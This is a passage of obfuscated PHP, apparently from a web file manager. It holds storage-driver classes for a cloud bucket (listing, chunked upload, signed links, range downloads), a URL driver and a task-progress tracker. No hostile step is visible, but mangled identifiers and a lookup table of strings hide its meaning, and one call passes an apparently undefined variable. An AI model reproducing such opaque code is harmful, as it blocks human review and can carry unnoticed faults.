fileList($Û²İøÈ‹, &$Š©ÙºÅ, &$¡½ñú…, $úéÛ„ ï = false) { $¼‡Ï†é =& $_SERVER[ú‡®¯¨±]; $ÏŒ˜ÀØ¬ = $¼‡Ï†é[12]; $Óğ‘æ©— = 1000; $½ê·¾„¶ = rtrim($Û²İøÈ‹, $¼‡Ï†é[8]) . $¼‡Ï†é[8]; while (!0) { check_abort(); $­¶»ù½‚ = $this->listObjs($Û²İøÈ‹, $ÏŒ˜ÀØ¬, $Óğ‘æ©—); if (!$­¶»ù½‚) { return !1; } $ÏŒ˜ÀØ¬ = isset($­¶»ù½‚[$¼‡Ï†é[1513]]) ? $­¶»ù½‚[$¼‡Ï†é[1513]] : $¼‡Ï†é[12]; $­¹ğÑå = isset($­¶»ù½‚[$¼‡Ï†é[1514]]) ? $­¶»ù½‚[$¼‡Ï†é[1514]] : array(); foreach ($­¹ğÑå as $µâÅÙÌø) { $Æ·Óğ‰í = $µâÅÙÌø[$¼‡Ï†é[33]] == $¼‡Ï†é[77] ? !0 : !1; $‹¼Æ´™’ = ltrim($½ê·¾„¶ . $µâÅÙÌø[$¼‡Ï†é[32]], $¼‡Ï†é[8]) . ($Æ·Óğ‰í ? $¼‡Ï†é[8] : $¼‡Ï†é[12]); $Û‰”şõÁ = array($¼‡Ï†é[32] => $‹¼Æ´™’, $¼‡Ï†é[33] => $Æ·Óğ‰í ? $¼‡Ï†é[77] : $¼‡Ï†é[226], $¼‡Ï†é[78] => $µâÅÙÌø[$¼‡Ï†é[392]], $¼‡Ï†é[1509] => $µâÅÙÌø[$¼‡Ï†é[1515]]); $this->cacheMethodInfoSet($‹¼Æ´™’, $Æ·Óğ‰í, $Û‰”şõÁ); if ($Æ·Óğ‰í) { $Š©ÙºÅ[] = $‹¼Æ´™’; if ($úéÛ„ ï) { $this->fileList($‹¼Æ´™’, $Š©ÙºÅ, $¡½ñú…, $úéÛ„ ï); } continue; } $¡½ñú…[] = $Û‰”şõÁ; } if (count($­¹ğÑå) < $Óğ‘æ©—) { break; } } $this->cacheMethodInfoSet($Û²İøÈ‹, !0); } public function listPath($Ãïô·šÑ, $‚ÛóÛ—Ü = false) { $à«ˆ ¤Ô =& $_SERVER[ú‡®¯¨±]; $‘ªİßÛÌ = $í’ü¼¿– = array(); $this->fileList($Ãïô·šÑ, $‘ªİßÛÌ, $í’ü¼¿–); foreach ($‘ªİßÛÌ as $°¼õİö => $Ä¦Ãı˜ƒ) { $‘ªİßÛÌ[$°¼õİö] = $this->folderInfo($Ä¦Ãı˜ƒ, $‚ÛóÛ—Ü); } foreach ($í’ü¼¿– as $°¼õİö => $Ä¦Ãı˜ƒ) { $í’ü¼¿–[$°¼õİö] = $this->fileInfo($Ä¦Ãı˜ƒ[$à«ˆ ¤Ô[32]], $‚ÛóÛ—Ü, $Ä¦Ãı˜ƒ); } return array($à«ˆ ¤Ô[84] => $‘ªİßÛÌ, $à«ˆ ¤Ô[85] => $í’ü¼¿–); } public function has($»¡çÂ§Ã, $‹‘ÊÉ† = false, $•äÍÕİš = true) { $•ÔÃ–§» =& $_SERVER[ú‡®¯¨±]; $ƒòûş„â = $•ÔÃ–§»[12]; $¿Ä¶û™Ù = 500; $ÕÑÏù = 0; $ÒåÓ¶î = 0; $±Ÿ”Ôšè = rtrim($»¡çÂ§Ã, $•ÔÃ–§»[8]) . $•ÔÃ–§»[8]; while (!0) { check_abort(); $ø®‡¢ = $this->listObjs($»¡çÂ§Ã, $ƒòûş„â, $¿Ä¶û™Ù); if (!$ø®‡¢) { return !1; } $ƒòûş„â = isset($ø®‡¢[$•ÔÃ–§»[1513]]) ? $ø®‡¢[$•ÔÃ–§»[1513]] : $•ÔÃ–§»[12]; $ğÙÓ•ã = isset($ø®‡¢[$•ÔÃ–§»[1514]]) ? $ø®‡¢[$•ÔÃ–§»[1514]] : array(); if (empty($ğÙÓ•ã)) { break; } $•¢ãğ“Ó = array_filter($ğÙÓ•ã, function ($§Ø¯òòŠ) { $¼æÇè‡± =& $_SERVER[ú‡®¯¨±]; return $§Ø¯òòŠ[$¼æÇè‡±[33]] == $¼æÇè‡±[77]; }); $¬˜ŠÖæÂ = count($ğÙÓ•ã); $•¢ãğ“Ó = count($•¢ãğ“Ó); $óÁ„åÜ§ = $¬˜ŠÖæÂ - $•¢ãğ“Ó; if ($‹‘ÊÉ†) { $ÒåÓ¶î += $•¢ãğ“Ó; $ÕÑÏù += $óÁ„åÜ§; if ($¬˜ŠÖæÂ < $¿Ä¶û™Ù) { break; } continue; } if ($•äÍÕİš) { if ($óÁ„åÜ§) { return !0; } } else { if ($•¢ãğ“Ó) { return !0; } } if ($¬˜ŠÖæÂ < $¿Ä¶û™Ù) { break; } } if ($‹‘ÊÉ†) { return array($•ÔÃ–§»[235] => $ÕÑÏù, $•ÔÃ–§»[236] => $ÒåÓ¶î); } return !1; } public function listAll($÷´¤•’œ) { $¶´»ÕïÊ =& $_SERVER[ú‡®¯¨±]; $Üòã¨Š› = $†È‚±ÑŒ = array(); $this->fileList($÷´¤•’œ, $Üòã¨Š›, $†È‚±ÑŒ, !0); $¯ü¤ú = array_to_keyvalue($†È‚±ÑŒ, $¶´»ÕïÊ[32]); foreach ($Üòã¨Š› as $­­åœ—Ï) { if (is_string($­­åœ—Ï)) { $¯ü¤ú[$­­åœ—Ï] = array($¶´»ÕïÊ[78] => 0); } } return $this->listAllFiles($÷´¤•’œ, $¯ü¤ú); } public function canRead($º‚á€ê ) { return $this->exist($º‚á€ê ) ? !0 : !1; } public function canWrite($ÅÁ…Üñ) { return $this->exist($ÅÁ…Üñ) ? !0 : !1; } public function getContent($‰¼„Õßá) { return $this->fileSubstr($‰¼„Õßá, 0, -1); } public function setContent($·‘çŸˆ, $ê©ƒ¸ëĞ = '') { $º¿¢«Øó =& $_SERVER[ú‡®¯¨±]; if (!$ê©ƒ¸ëĞ) { $¢í¿Ô•ó = $this->ussRequest($·‘çŸˆ, $º¿¢«Øó[253]); return $¢í¿Ô•ó[$º¿¢«Øó[1268]]; } $°Š°è… = $this->tempFile($this->pathThis($·‘çŸˆ)); file_put_contents($°Š°è…, $ê©ƒ¸ëĞ); if ($this->upload($·‘çŸˆ, $°Š°è…)) { $this->tempFileRemve($°Š°è…); return !0; } return !1; } public function fileSubstr($Á˜ÈÇ–…, $±Â£µ±ß, $‚ôÌêöê) { $§•¾ã¶é =& $_SERVER[ú‡®¯¨±]; if (!($¾íÆÌäÚ = $this->link($Á˜ÈÇ–…))) { return !1; } $òáüÑ¡· = !1; if ($‚ôÌêöê > 0) { $Ñ¹Øº½ = $±Â£µ±ß + $‚ôÌêöê - 1; $òáüÑ¡· = array($§•¾ã¶é[1476] . $±Â£µ±ß . $§•¾ã¶é[440] . $Ñ¹Øº½); } $şäŸ‡Ö = url_request($¾íÆÌäÚ, $§•¾ã¶é[257], !1, $òáüÑ¡·); return $şäŸ‡Ö[$§•¾ã¶é[805]] ? $şäŸ‡Ö[$§•¾ã¶é[1258]] : !1; } public function upload($ÃºÛÊš«, $¥ñÅÒõ¼, $¿ò•¯¸œ = false, $û¢ªğ– = REPEAT_REPLACE) { $ÑçÌ…ÇÜ =& $_SERVER[ú‡®¯¨±]; $çÂ–ƒ×€ = IO::size($¥ñÅÒõ¼); if ($çÂ–ƒ×€ <= 1024 * 1024 * 200) { $ŒĞüëìà = array($ÑçÌ…ÇÜ[1516] . $¥ñÅÒõ¼); $éÊÕ…Àõ = $this->ussRequest($ÃºÛÊš«, $ÑçÌ…ÇÜ[255], $ŒĞüëìà); return $éÊÕ…Àõ[$ÑçÌ…ÇÜ[1268]] ? $this->getPathOuter($ÃºÛÊš«) : !1; } $îõÇÕ· = 1024 * 1024 * 10; $ş·³ÓóÅ = array($ÑçÌ…ÇÜ[1517], $ÑçÌ…ÇÜ[1518] . $çÂ–ƒ×€, $ÑçÌ…ÇÜ[1519], $ÑçÌ…ÇÜ[1520] . $îõÇÕ·); $éÊÕ…Àõ = $this->ussRequest($ÃºÛÊš«, $ÑçÌ…ÇÜ[255], !1, $ş·³ÓóÅ); if (!$éÊÕ…Àõ[$ÑçÌ…ÇÜ[1268]]) { return !1; } $ïÒÓÁóú = $éÊÕ…Àõ[$ÑçÌ…ÇÜ[1258]]; $êİÃ€Ú = 0; $„Ö”ŞšÙ = $ïÒÓÁóú[$ÑçÌ…ÇÜ[1521]]; $Ê¨Ñ”‚ì = fopen($¥ñÅÒõ¼, $ÑçÌ…ÇÜ[1423]); if (!$Ê¨Ñ”‚ì) { return !1; } do { $¿Ì‡Ò³ç = $ïÒÓÁóú[$ÑçÌ…ÇÜ[1522]]; fseek_64($Ê¨Ñ”‚ì, $êİÃ€Ú); $êĞí‡Œ‹ = fread($Ê¨Ñ”‚ì, $¿Ì‡Ò³ç); $îöŠÛÇ = 0; do { $îöŠÛÇ++; $ïÒÓÁóú = $this->uploadPart($ÃºÛÊš«, $ïÒÓÁóú, $êĞí‡Œ‹); } while (!$ïÒÓÁóú && $îöŠÛÇ < 3); if (!$ïÒÓÁóú) { return !1; } $„Ö”ŞšÙ = $ïÒÓÁóú[$ÑçÌ…ÇÜ[1521]]; $êİÃ€Ú += $¿Ì‡Ò³ç; } while ($„Ö”ŞšÙ != -1); fclose($Ê¨Ñ”‚ì); $ş·³ÓóÅ = array($ÑçÌ…ÇÜ[1523], $ÑçÌ…ÇÜ[1524] . $ïÒÓÁóú[$ÑçÌ…ÇÜ[1525]], $ÑçÌ…ÇÜ[1519]); $éÊÕ…Àõ = $this->ussRequest($ÃºÛÊš«, $ÑçÌ…ÇÜ[255], !1, $ş·³ÓóÅ); return $éÊÕ…Àõ[$ÑçÌ…ÇÜ[1268]] ? $this->getPathOuter($ÒÃ Ñ›–) : !1; } private function uploadPart($€Ïöƒ¹ş, $èÄ–ºĞ”, &$¢Îº½¿) { $“î™ÆÏÄ =& $_SERVER[ú‡®¯¨±]; $ê½ŠµÓ´ = array($“î™ÆÏÄ[1526], $“î™ÆÏÄ[1524] . $èÄ–ºĞ”[$“î™ÆÏÄ[1525]], $“î™ÆÏÄ[1527] . $èÄ–ºĞ”[$“î™ÆÏÄ[1521]], $“î™ÆÏÄ[145] . $èÄ–ºĞ”[$“î™ÆÏÄ[1522]]); $ÚîÀ¿Ø = $this->ussRequest($€Ïöƒ¹ş, $“î™ÆÏÄ[255], $¢Îº½¿, $ê½ŠµÓ´); return !$ÚîÀ¿Ø[$“î™ÆÏÄ[1268]] ? $ÚîÀ¿Ø[$“î™ÆÏÄ[1268]] : $ÚîÀ¿Ø[$“î™ÆÏÄ[1258]]; } public function uploadFormData($°Ä ‹¸…, $åÖ¢³Š” = 3600) { return $this->uploadPolicy($°Ä ‹¸…, $åÖ¢³Š”); } public function multiUploadFormData($œÓæ‘£, $ù˜¦å½¨ = 3600) { $­½èä±Ï =& $_SERVER[ú‡®¯¨±]; $û”›—Å = (int) $GLOBALS[$­½èä±Ï[7]][$­½èä±Ï[78]]; return $this->uploadPolicy($œÓæ‘£, $ù˜¦å½¨, $û”›—Å); } private function uploadPolicy($‚ÌŠàçÈ, $×«¥Ğ¼© = 3600, $¶ºäÏ±Š = 0) { $ø¸¬Šù =& $_SERVER[ú‡®¯¨±]; $õêü”Ş = $ø¸¬Šù[8] . $this->bucket; $†Û‰´ı¾ = gmdate($ø¸¬Šù[1462]); $ªï¸®¼Š = array($ø¸¬Šù[1528] => $this->bucket, $ø¸¬Šù[1529] => $‚ÌŠàçÈ, $ø¸¬Šù[1530] => time() + $×«¥Ğ¼©, $ø¸¬Šù[1531] => $†Û‰´ı¾); if ($¶ºäÏ±Š) { $ªï¸®¼Š[$ø¸¬Šù[1443]] = $¶ºäÏ±Š; } $À×•½ à = base64_encode(json_encode($ªï¸®¼Š)); $ıªğÂëì = base64_encode(hash_hmac($ø¸¬Šù[1498], "\120\117\x53\124\x26{$õêü”Ş}\x26{$†Û‰´ı¾}\46{$À×•½ à}", md5("{$this->userpass}"), !0)); $ïÉÃÕæû = array($ø¸¬Šù[287] => $À×•½ à, $ø¸¬Šù[1532] => "\x55\120\131\x55\x4e\x20{$this->username}\72{$ıªğÂëì}", $ø¸¬Šù[198] => $this->endpoint . $õêü”Ş); return $ïÉÃÕæû; } public function download($¹í†š„ï, $ú‹™ Ê) { $Â‚›‚ìÜ = IO::getPathInner(IO::mkfile($ú‹™ Ê)); if (!($èŸ©Íö = $this->link($¹í†š„ï))) { return !1; } $…û„•ş = 0; $‚Æ©”†Ë = 1024 * 200; $îÕ¢‡É¶ = fopen($Â‚›‚ìÜ, $_SERVER[ú‡®¯¨±][1482]); while (!0) { $‘¨¨±¯ô = $this->fileSubstr($¹í†š„ï, $…û„•ş, $‚Æ©”†Ë); if ($‘¨¨±¯ô === !1) { return !1; } fwrite($îÕ¢‡É¶, $‘¨¨±¯ô); $…û„•ş += $‚Æ©”†Ë; if (strlen($‘¨¨±¯ô) < $‚Æ©”†Ë) { break; } } fclose($îÕ¢‡É¶); return $ú‹™ Ê; } public function link($ÎŞ—İ³·, $–ö±ü¾Ş = array()) { $´áêê´› =& $_SERVER[ú‡®¯¨±]; $ÎŞ—İ³· = trim($ÎŞ—İ³·, $´áêê´›[8]); if (!empty($this->token)) { $Œ¤¯â©‰ = strtotime(date($´áêê´›[1533])); $Ú¥ıÕÓ = substr(md5($this->token . $´áêê´›[339] . $Œ¤¯â©‰ . $´áêê´›[1534] . $ÎŞ—İ³·), 12, 8) . $Œ¤¯â©‰; $–ö±ü¾Ş[] = $´áêê´›[1535] . $Ú¥ıÕÓ; } $¥Ğ¸ó¤¼ = !empty($–ö±ü¾Ş) ? $´áêê´›[75] . implode($´áêê´›[339], $–ö±ü¾Ş) : $´áêê´›[12]; return $this->getHost() . $´áêê´›[8] . $ÎŞ—İ³· . $¥Ğ¸ó¤¼; } public function fileOut($ƒ•ßòñÃ, $½º“àˆÏ = false, $¹é®‚ø = false, $«ÍĞïìÒ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ƒ•ßòñÃ, $½º“àˆÏ, $¹é®‚ø, $«ÍĞïìÒ); } if (!$¹é®‚ø) { $¹é®‚ø = $this->pathThis($ƒ•ßòñÃ); } $±’²†şè = $½º“àˆÏ ? array($_SERVER[ú‡®¯¨±][1536] . rawurlencode($¹é®‚ø)) : array(); $ğûÛì´ = $this->link($ƒ•ßòñÃ, $±’²†şè); $this->fileOutLink($ğûÛì´); } public function fileOutServer($ú­¿‰™, $ªçå§®½ = false, $µÀ¬·Üß = false, $¤÷šú¦Ñ = '') { parent::fileOut($ú­¿‰™, $ªçå§®½, $µÀ¬·Üß, $¤÷šú¦Ñ); } public function fileOutImage($«²‹Ûˆ, $¿Şâó…› = 250) { $™ŞÚìµÚ = $this->link($«²‹Ûˆ . $_SERVER[ú‡®¯¨±][1537] . $¿Şâó…›); $this->fileOutLink($™ŞÚìµÚ); } public function fileOutImageServer($”Øàó¢ı, $Á®ï¢Ù = 250) { parent::fileOutImage($”Øàó¢ı, $Á®ï¢Ù); } public function hashMd5($ôöñ ğã) { $òßÊÚè‘ =& $_SERVER[ú‡®¯¨±]; $’¬ãÑ€” = $this->_objectMeta($ôöñ ğã); return isset($’¬ãÑ€”[$òßÊÚè‘[240]]) ? $’¬ãÑ€”[$òßÊÚè‘[240]] : !1; } public function size($±êÃ¦‡”) { $€“ÃÔ¹ = $this->objectMeta($±êÃ¦‡”); return $€“ÃÔ¹ ? $€“ÃÔ¹[$_SERVER[ú‡®¯¨±][78]] : 0; } public function info($‘ªƒÀ©˜) { if ($this->isFolder($‘ªƒÀ©˜)) { return $this->folderInfo($‘ªƒÀ©˜); } else { if ($this->isFile($‘ªƒÀ©˜)) { return $this->fileInfo($‘ªƒÀ©˜); } } return !1; } public function exist($Ù¢ëÆ×Ë) { return $this->isFile($Ù¢ëÆ×Ë) || $this->isFolder($Ù¢ëÆ×Ë); } public function isFile($ºó·ÍÏ¿) { return !$this->isFolder($ºó·ÍÏ¿) && $this->objectMeta($ºó·ÍÏ¿); } public function isFolder($–î³™•Ó) { return $this->cacheMethod($_SERVER[ú‡®¯¨±][168], $–î³™•Ó); } protected function objectMeta($±ŞÃñô) { return $this->cacheMethod($_SERVER[ú‡®¯¨±][170], $±ŞÃñô); } protected function _objectMeta($îªò÷¶) { $¥À“ÃÂê =& $_SERVER[ú‡®¯¨±]; if ($îªò÷¶ == $¥À“ÃÂê[12] || $îªò÷¶ == $¥À“ÃÂê[8]) { return array(); } $ÌÖÌú• = $this->ussRequest($îªò÷¶, $¥À“ÃÂê[1538]); if (!$ÌÖÌú•[$¥À“ÃÂê[1268]]) { return null; } $äÓŸ‰ = isset($ÌÖÌú•[$¥À“ÃÂê[1258]]) ? $ÌÖÌú•[$¥À“ÃÂê[1258]] : array(); if (!isset($äÓŸ‰[$¥À“ÃÂê[1539]])) { return null; } $€×¸ÛÃ = array($¥À“ÃÂê[33] => isset($äÓŸ‰[$¥À“ÃÂê[1539]]) ? $äÓŸ‰[$¥À“ÃÂê[1539]] : null, $¥À“ÃÂê[78] => isset($äÓŸ‰[$¥À“ÃÂê[1540]]) ? $äÓŸ‰[$¥À“ÃÂê[1540]] : null, $¥À“ÃÂê[240] => isset($äÓŸ‰[$¥À“ÃÂê[1541]]) ? $äÓŸ‰[$¥À“ÃÂê[1541]] : null, $¥À“ÃÂê[1508] => isset($äÓŸ‰[$¥À“ÃÂê[1542]]) ? $äÓŸ‰[$¥À“ÃÂê[1542]] : null); $€×¸ÛÃ[$¥À“ÃÂê[1509]] = isset($äÓŸ‰[$¥À“ÃÂê[1543]]) ? strtotime($äÓŸ‰[$¥À“ÃÂê[1543]]) : $€×¸ÛÃ[$¥À“ÃÂê[1508]]; return $€×¸ÛÃ; } protected function _isFolder($ÌÛãé¿Å) { $½Å²€û =& $_SERVER[ú‡®¯¨±]; if ($ÌÛãé¿Å == $½Å²€û[12] || $ÌÛãé¿Å == $½Å²€û[8]) { return !0; } $à€²¾š‹ = $this->_objectMeta($ÌÛãé¿Å); return isset($à€²¾š‹[$½Å²€û[33]]) && $à€²¾š‹[$½Å²€û[33]] == $½Å²€û[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($’´à¡«Û = false) { } public function exist($„à”®¦) { $ªµ»ªºÒ = $this->info($„à”®¦); return $ªµ»ªºÒ[$_SERVER[ú‡®¯¨±][228]]; } public function isFile($°ìÌÏø) { $Ô¥´™ëÃ = $this->info($°ìÌÏø); return $Ô¥´™ëÃ[$_SERVER[ú‡®¯¨±][228]]; } public function isFolder($Ú×ûà«¼) { return !1; } public function size($ˆé¤êóØ) { $À†ˆ¤Â¨ = $this->info($ˆé¤êóØ); return $À†ˆ¤Â¨[$_SERVER[ú‡®¯¨±][78]]; } public function info($è´÷øÀ) { return $this->infoParse($è´÷øÀ); } public function infoAuth($Î€³ñ¦À) { return $this->infoParse($Î€³ñ¦À); } public function infoWithChildren($ÀÄ—ÏŠ) { return $this->infoParse($ÀÄ—ÏŠ); } public function infoFull($Îá¼™…) { return $this->infoParse($Îá¼™…); } private function infoParse($Äˆ¿´†) { $©Û¡ÇÃÄ =& $_SERVER[ú‡®¯¨±]; $ËñÊâ³ñ = $this->header($Äˆ¿´†); if (!$ËñÊâ³ñ || !$ËñÊâ³ñ[$©Û¡ÇÃÄ[805]]) { return !1; } $Õå¤Øİ² = _get($ËñÊâ³ñ, $©Û¡ÇÃÄ[392], 0); $ÅÇ´“å„ = array($©Û¡ÇÃÄ[32] => $ËñÊâ³ñ[$©Û¡ÇÃÄ[32]], $©Û¡ÇÃÄ[86] => $Äˆ¿´†, $©Û¡ÇÃÄ[33] => $©Û¡ÇÃÄ[226], $©Û¡ÇÃÄ[78] => intval($Õå¤Øİ²), $©Û¡ÇÃÄ[177] => get_path_ext($ËñÊâ³ñ[$©Û¡ÇÃÄ[32]]), $©Û¡ÇÃÄ[1420] => $Õå¤Øİ² > 0 && $ËñÊâ³ñ[$©Û¡ÇÃÄ[1544]], $©Û¡ÇÃÄ[1421] => !1); return $ÅÇ´“å„; } private function header($ôš›»…ñ) { $¼ÊËˆÄ¢ =& $_SERVER[ú‡®¯¨±]; if (isset(self::$_cacheHeader[$ôš›»…ñ])) { return self::$_cacheHeader[$ôš›»…ñ]; } $¢¨¤ÊÁ™ = isset($GLOBALS[$¼ÊËˆÄ¢[1545]]) ? $GLOBALS[$¼ÊËˆÄ¢[1545]] : !1; $GLOBALS[$¼ÊËˆÄ¢[1545]] = !0; self::$_cacheHeader[$ôš›»…ñ] = url_header($ôš›»…ñ); $GLOBALS[$¼ÊËˆÄ¢[1545]] = $¢¨¤ÊÁ™; return self::$_cacheHeader[$ôš›»…ñ]; } public function hashSimple($éÅÊÙ³„, $‹øÂ¥Ë = false) { $™Ä ş˜ı =& $_SERVER[ú‡®¯¨±]; $çıÎ˜ = $this->info($éÅÊÙ³„); if (!$çıÎ˜ || !$çıÎ˜[$™Ä ş˜ı[228]]) { return !1; } $†ª‰„±È = $çıÎ˜[$™Ä ş˜ı[78]]; $®ĞëĞŠ = 200; $•™Ÿé¢ş = 50; if ($†ª‰„±È <= $®ĞëĞŠ * $•™Ÿé¢ş) { return md5($this->fileSubstr($éÅÊÙ³„, 0, $†ª‰„±È)) . $†ª‰„±È; } $åŞ€âùÏ = intval($†ª‰„±È / $•™Ÿé¢ş); $Ú½êŞªÀ = $™Ä ş˜ı[12]; $±Ã“×ùÏ = timeFloat(); $¥Õ‰«¦ = 15; for ($Ÿ¹Õ¾ƒ‚ = 0; $Ÿ¹Õ¾ƒ‚ < $•™Ÿé¢ş; $Ÿ¹Õ¾ƒ‚++) { if (timeFloat() - $±Ã“×ùÏ > $¥Õ‰«¦) { return !1; } $Êµ¿¼· = $this->fileSubstr($éÅÊÙ³„, $åŞ€âùÏ * $Ÿ¹Õ¾ƒ‚, $®ĞëĞŠ); if (!$Êµ¿¼·) { return !1; } $Ú½êŞªÀ .= $Êµ¿¼·; } $Ú½êŞªÀ .= $this->fileSubstr($éÅÊÙ³„, $†ª‰„±È - $®ĞëĞŠ, $®ĞëĞŠ); return md5($Ú½êŞªÀ) . $†ª‰„±È; } public function getContent($®éƒĞğ) { return $this->fileSubstr($®éƒĞğ); } public function fileSubstr($ ™¿Ş£ª, $ÎáÏÎ˜› = 0, $×ËÓ³Ô„ = -1) { $ŞŒÖ¬Ïë =& $_SERVER[ú‡®¯¨±]; $©ş¦¶®ò = $this->info($ ™¿Ş£ª); if (!$©ş¦¶®ò || !$©ş¦¶®ò[$ŞŒÖ¬Ïë[228]] && $©ş¦¶®ò[$ŞŒÖ¬Ïë[78]] > 1024 * 1024 * 10) { return !1; } if ($×ËÓ³Ô„ === -1) { $×ËÓ³Ô„ = $©ş¦¶®ò[$ŞŒÖ¬Ïë[78]]; } if ($×ËÓ³Ô„ == 0) { return $ŞŒÖ¬Ïë[12]; } $àßæàØ‰ = array($ŞŒÖ¬Ïë[1546] . $ÎáÏÎ˜› . $ŞŒÖ¬Ïë[837] . ($ÎáÏÎ˜› + $×ËÓ³Ô„ - 1)); $½øò‡»• = url_request($ ™¿Ş£ª, $ŞŒÖ¬Ïë[257], !1, $àßæàØ‰, !1, !1, 30); return $½øò‡»•[$ŞŒÖ¬Ïë[1258]] ? $½øò‡»•[$ŞŒÖ¬Ïë[1258]] : $ŞŒÖ¬Ïë[12]; } public function download($Ş–“ç‹¶, $ÖåÊ¥Ã±) { Downloader::start($Ş–“ç‹¶, $ÖåÊ¥Ã±); return $ÖåÊ¥Ã±; } } goto E…Ñ°ØÇ…; BÕÌÚñÏ²¾: class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\165\x6e\156\x69\x6e\147"; const STATYS_KILL = "\153\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Æ€ºè‘ƒ, $¹Èİ´¾ = '', $½ÕÜÆò = 0, $‰³ €³Ï = '') { $“…®–ö« =& $_SERVER[ú‡®¯¨±]; if (self::get($Æ€ºè‘ƒ)) { return; } $this->task = array($“…®–ö«[453] => $Æ€ºè‘ƒ, $“…®–ö«[1708] => USER_ID, $“…®–ö«[1598] => $‰³ €³Ï, $“…®–ö«[504] => $“…®–ö«[12], $“…®–ö«[33] => $¹Èİ´¾, $“…®–ö«[1120] => $“…®–ö«[12], $“…®–ö«[841] => $½ÕÜÆò, $“…®–ö«[1709] => 0, $“…®–ö«[1710] => 0, $“…®–ö«[1711] => 0, $“…®–ö«[1712] => timeFloat(), $“…®–ö«[1713] => 0, $“…®–ö«[1714] => 0, $“…®–ö«[1715] => 0, $“…®–ö«[1716] => 0, $“…®–ö«[805] => $“…®–ö«[1658]); $GLOBALS[$“…®–ö«[1717]] = 1; Hook::bind($“…®–ö«[1662], array($this, $“…®–ö«[1718])); Hook::bind($“…®–ö«[1719], array($this, $“…®–ö«[1720])); $this->startAfter(); Hook::trigger($“…®–ö«[1721], $this->task); $this->task[$“…®–ö«[1714]] = timeFloat(); } public function end($øçØÁãå = '') { $ÔåÌ•„Ş =& $_SERVER[ú‡®¯¨±]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÔåÌ•„Ş[1714]]) { self::valueSet($this->task[$ÔåÌ•„Ş[453]], !1); } $this->isEnd = !0; if ($øçØÁãå) { $this->task[$ÔåÌ•„Ş[504]] = $øçØÁãå; } self::log($ÔåÌ•„Ş[1722] . $this->task[$ÔåÌ•„Ş[453]] . $ÔåÌ•„Ş[1723] . sprintf($ÔåÌ•„Ş[906], timeFloat() - $this->task[$ÔåÌ•„Ş[1712]]) . $ÔåÌ•„Ş[1724]); Hook::unbind($ÔåÌ•„Ş[1662], array($this, $ÔåÌ•„Ş[1718])); Hook::unbind($ÔåÌ•„Ş[1719], array($this, $ÔåÌ•„Ş[1720])); $this->endAfter(); $Üéâø¿  = $this->task; $this->task = !1; Hook::trigger($ÔåÌ•„Ş[1725], $Üéâø¿ ); } public function update($µ¦«ÜÎê = 0, $œÁ¿¾·¸ = false) { $Í °òö =& $_SERVER[ú‡®¯¨±]; $õ’™Ó¯İ =& $this->task; if (!$õ’™Ó¯İ) { return; } $õ’™Ó¯İ[$Í °òö[1709]] += $µ¦«ÜÎê; $õ’™Ó¯İ[$Í °òö[1713]] = timeFloat(); if ($õ’™Ó¯İ[$Í °òö[841]]) { if ($õ’™Ó¯İ[$Í °òö[841]] < $õ’™Ó¯İ[$Í °òö[1709]]) { $õ’™Ó¯İ[$Í °òö[841]] = $õ’™Ó¯İ[$Í °òö[1709]]; } $Õ—¦ÏÏŒ = timeFloat() - $õ’™Ó¯İ[$Í °òö[1712]] - $õ’™Ó¯İ[$Í °òö[1715]]; if ($Õ—¦ÏÏŒ <= 0) { $Õ—¦ÏÏŒ = 0.001; } $õ’™Ó¯İ[$Í °òö[1710]] = $õ’™Ó¯İ[$Í °òö[1709]] / $õ’™Ó¯İ[$Í °òö[841]]; $õ’™Ó¯İ[$Í °òö[1711]] = $õ’™Ó¯İ[$Í °òö[1709]] / $Õ—¦ÏÏŒ; if ($õ’™Ó¯İ[$Í °òö[1710]] > 0) { $õ’™Ó¯İ[$Í °òö[1716]] = $Õ—¦ÏÏŒ * (1 - $õ’™Ó¯İ[$Í °òö[1710]]) / $õ’™Ó¯İ[$Í °òö[1710]]; } $õ’™Ó¯İ[$Í °òö[1716]] = $õ’™Ó¯İ[$Í °òö[1716]] <= 0 ? 0 : $õ’™Ó¯İ[$Í °òö[1716]]; } $this->updateAfter(); $ØÁğÏ = 0.2; if (timeFloat() - $õ’™Ó¯İ[$Í °òö[1714]] < $ØÁğÏ && !$œÁ¿¾·¸) { return; } $•¾·„İş = self::get($õ’™Ó¯İ[$Í °òö[453]]); $ö¡Š¹­ = $•¾·„İş[$Í °òö[805]]; if ($ö¡Š¹­ == self::STATYS_KILL) { $‚ß¯ƒè¼ = array($Í °òö[1726] => LNG($Í °òö[1727]), $Í °òö[1268] => !1); Cache::set($Í °òö[1728] . $this->task[$Í °òö[453]], $‚ß¯ƒè¼, 30); $this->onKill(); $this->end(); die; } else { if ($ö¡Š¹­ == self::STATYS_STOP) { $­¸ë€È = 2; $•¾·„İş[$Í °òö[1715]] += $­¸ë€È; self::valueSet($õ’™Ó¯İ[$Í °òö[453]], $•¾·„İş); sleep($­¸ë€È); $this->update(); return; } } $õ’™Ó¯İ[$Í °òö[805]] = $ö¡Š¹­ ? $ö¡Š¹­ : $õ’™Ó¯İ[$Í °òö[805]]; $õ’™Ó¯İ[$Í °òö[1715]] = $•¾·„İş[$Í °òö[1715]] ? $•¾·„İş[$Í °òö[1715]] : 0; $õ’™Ó¯İ[$Í °òö[1714]] = timeFloat(); Hook::trigger($Í °òö[1729], $õ’™Ó¯İ); self::valueSet($õ’™Ó¯İ[$Í °òö[453]], $õ’™Ó¯İ); } public function onKillSet($Ş‰Èû²õ, $»“¿ë¡ç = array()) { $this->onKillCall = array($Ş‰Èû²õ, $»“¿ë¡ç); } public function onKill() { $²Õ©Ï =& $_SERVER[ú‡®¯¨±]; self::log($²Õ©Ï[1722] . $this->task[$²Õ©Ï[453]] . $²Õ©Ï[1730]); Hook::trigger($²Õ©Ï[1731], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Å×·ö†×) { $ËÀÍ¢½¹ =& $_SERVER[ú‡®¯¨±]; Cache::set($ËÀÍ¢½¹[1728] . $this->task[$ËÀÍ¢½¹[453]], $Å×·ö†×, 60); return $Å×·ö†×; } public static function get($èÓ€â½¯) { $Ä‘ôÆ±› =& 